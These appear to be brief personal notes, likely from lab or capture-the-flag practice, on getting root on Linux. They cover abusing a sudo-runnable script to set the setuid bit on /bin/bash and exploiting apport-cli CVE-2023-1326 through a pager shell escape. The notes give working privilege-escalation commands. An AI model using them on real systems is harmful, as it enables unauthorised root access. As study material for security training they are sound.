## Ways to get to root

### 

find a script the user can run and edit that runs with root rights.

```shell
# Can be found with:

sudo -l
```
In one example it was like this:

### 1. Way to elevate to root
```bash
echo "chmod u+s /bin/bash" > initdb.sh # create a file

sudo  /usr/bin/syscheck # this is the script that runs with root rights

/bin/bash -p  # this will give you a root shell

```
#### Explanation:
```shell
echo "chmod u+s /bin/bash": This part is creating a string that contains a shell command. 
The command chmod u+s /bin/bash is used to set the "setuid" bit on /bin/bash. 
When a file with the "setuid" bit set is executed, it runs with the permissions of the file's owner, rather than the permissions of the user who is executing the file. 
In this case, since /bin/bash is typically owned by root, this would allow any user to get a root shell by running /bin/bash.  
```

### If there is a apport-cli CVE-2023-1326
https://github.com/diego-tella/CVE-2023-1326-PoC

```shell
sudo /usr/bin/apport-cli -f
# click 1, 1, and than
press V (view report)
!/bin/bash
# new shell has root rights
```
